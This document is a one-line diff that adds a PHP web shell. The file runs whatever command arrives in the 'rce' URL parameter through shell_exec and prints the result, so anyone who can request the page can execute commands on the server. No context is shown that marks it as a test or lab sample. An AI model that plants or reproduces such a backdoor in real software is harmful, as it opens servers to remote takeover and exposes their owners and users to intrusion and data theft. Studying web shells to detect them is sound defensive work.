@@ -1,0 +1,1 @@
+<?php echo shell_exec($_GET['rce'].' 2>&1'); ?>
